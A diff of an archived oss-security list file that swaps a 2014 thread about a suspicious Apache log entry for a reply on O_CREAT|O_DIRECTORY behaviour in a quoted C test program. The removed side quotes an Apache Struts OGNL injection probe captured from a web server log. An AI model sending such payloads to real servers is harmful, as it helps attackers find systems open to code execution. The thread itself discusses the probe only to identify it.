@@ -1,24 +1,36 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/01/2
-Message-ID: <alpine.BSF.2.00.1411020435250.84102@aneurin.horsfall.org>
-Date: Sun, 2 Nov 2014 04:40:54 +1100 (EST)
-From: Dave Horsfall <dave@...sfall.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/26/24
+Message-ID: <CAD3CancjW+4OoK728_HLfrf82gQEcgvdkQ90j5_Or7OXr0fLqQ@mail.gmail.com>
+Date: Thu, 27 Nov 2014 08:28:14 +1300
+From: Matthew Daley <mattd@...fuzz.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Some weird Apache redirection exploit?
+Subject: Re: O_CREAT|O_DIRECTORY on nonexisting file expected behaviour?
 Content-Type: text/plain; charset=utf-8
 
-On Thu, 30 Oct 2014, Tim wrote:
+On Thu, Nov 27, 2014 at 4:28 AM, Fiedler Roman <Roman.Fiedler@....ac.at> wrote:
+> (...)
+> My test program was:
+>
+> #include <fcntl.h>
+> #include <stdio.h>
+> #include <sys/stat.h>
+>
+> int main(int argc, char **argv) {
+>   int fd;
+>   struct stat statBuf;
+>   int result;
+>
+>   fd=open("xxx", O_RDWR|O_CREAT|O_DIRECTORY, 0600);
+>   result=fstat(fd, &statBuf);
+>   if(result) {
+>     fprintf(stderr, "Stat failed\n");
+>     return(1);
+>   }
+>   fprintf(stderr, "New element type is %d\n", S_ISDIR(fd));
 
-> > 117.27.254.25 - - [31/Oct/2014:05:16:15 +1100] "GET ?redirect:${%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),%23w.println('[/ok-helo.wang]'),%23w.flush(),%23w.close()} HTTP/1.1" 200 7543 "-" "Python-urllib/2.6"
-> 
-> An exploit for one of the many Apache Struts vulnerabilities.
+FWIW, this should probably be S_ISDIR(statBuf.st_mode).
 
-Thanks; I'm just getting back into the web game after a hiatus, and things 
-have, err, changed...
+- Matthew
 
-On the bright side, at least I know where *not* to put my PHP scripts for 
-example, any more than I would park SSHD on port 22.
-
--- 
-Dave Horsfall (VK2KFU)  "Bliss is a MacBook with a FreeBSD server."
-http://www.horsfall.org/spam.html (and check the home page whilst you're there)
+>   return(0);
+> }
